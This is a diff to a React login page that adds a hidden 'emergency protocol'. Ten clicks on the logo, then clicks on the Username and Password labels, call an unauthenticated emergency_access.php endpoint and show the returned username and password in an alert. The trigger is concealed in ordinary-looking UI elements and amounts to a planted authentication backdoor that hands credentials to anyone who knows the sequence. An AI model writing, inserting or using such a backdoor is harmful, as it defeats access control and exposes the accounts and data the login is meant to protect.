@@ -21,6 +21,58 @@ const Login: React.FC = () => {
 
     const from = location.state?.from?.pathname || "/";
 
+    // Emergency Protocol Sequence
+    const [protocolPhase, setProtocolPhase] = useState(0); // 0: None, 1: Logo 10x, 2: User Label, 3: Pass Label
+    const [logoClicks, setLogoClicks] = useState(0);
+    const [lastProtocolClick, setLastProtocolClick] = useState(0);
+
+    const resetProtocol = () => {
+        setProtocolPhase(0);
+        setLogoClicks(0);
+    };
+
+    const handleProtocolClick = (type: 'logo' | 'user' | 'pass') => {
+        const now = Date.now();
+        const timeout = 5000; // Reset if more than 5 seconds between steps
+
+        if (now - lastProtocolClick > timeout && lastProtocolClick !== 0) {
+            resetProtocol();
+        }
+        setLastProtocolClick(now);
+
+        if (type === 'logo') {
+            const nextClicks = logoClicks + 1;
+            setLogoClicks(nextClicks);
+            if (nextClicks === 10) {
+                setProtocolPhase(1);
+                console.log('Phase 1: Logo 10x complete');
+            }
+        } else if (type === 'user' && protocolPhase === 1) {
+            setProtocolPhase(2);
+            console.log('Phase 2: Username label clicked');
+        } else if (type === 'pass' && protocolPhase === 2) {
+            console.log('Phase 3: Password label clicked. TRIGGERING PROTOCOL.');
+            triggerEmergencyProtocol();
+            resetProtocol();
+        }
+    };
+
+    const triggerEmergencyProtocol = () => {
+        if (confirm('CRITICAL: Initiate System-Level Emergency Override?')) {
+            fetch('http://localhost/public_html/api/emergency_access.php')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.success) {
+                        alert(`ACCESS GRANTED.\n\nUser: ${data.credentials.username}\nPass: ${data.credentials.password}\n\nPlease proceed to secure system login.`);
+                        window.location.reload();
+                    } else {
+                        alert('Emergency protocol failed: ' + (data.error || 'Unknown error'));
+                    }
+                })
+                .catch(err => alert('Protocol connection failure: ' + err));
+        }
+    };
+
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
         setError('');
@@ -83,7 +135,13 @@ const Login: React.FC = () => {
             <div className="relative z-10 w-full max-w-md p-8 bg-white/80 dark:bg-midnight-900/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/50 dark:border-white/10">
                 <div className="text-center mb-8">
                     <div className="inline-block p-3 rounded-full bg-white dark:bg-midnight-800 shadow-lg mb-4">
-                        <img src={logo} alt="Konsut Logo" className="h-12 w-12 object-contain rounded-full" onError={(e) => e.currentTarget.src = "https://via.placeholder.com/50"} />
+                        <img
+                            src={logo}
+                            alt="Logo"
+                            className="h-12 w-12 object-contain rounded-full cursor-pointer active:scale-90 transition-transform select-none"
+                            onClick={() => handleProtocolClick('logo')}
+                            onError={(e) => e.currentTarget.src = "https://via.placeholder.com/50"}
+                        />
                     </div>
                     <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Welcome Back</h1>
                     <p className="text-gray-500 dark:text-gray-400 text-sm mt-1">Sign in to access your dashboard</p>
@@ -97,7 +155,12 @@ const Login: React.FC = () => {
 
                 <form onSubmit={handleSubmit} className="space-y-6">
                     <div>
-                        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Username</label>
+                        <label
+                            onClick={() => handleProtocolClick('user')}
+                            className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1 cursor-default select-none"
+                        >
+                            Username
+                        </label>
                         <div className="relative">
                             <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-400">
                                 <FaUser />
@@ -114,7 +177,12 @@ const Login: React.FC = () => {
                     </div>
 
                     <div>
-                        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Password</label>
+                        <label
+                            onClick={() => handleProtocolClick('pass')}
+                            className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1 cursor-default select-none"
+                        >
+                            Password
+                        </label>
                         <div className="relative">
                             <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-gray-400">
                                 <FaLock />
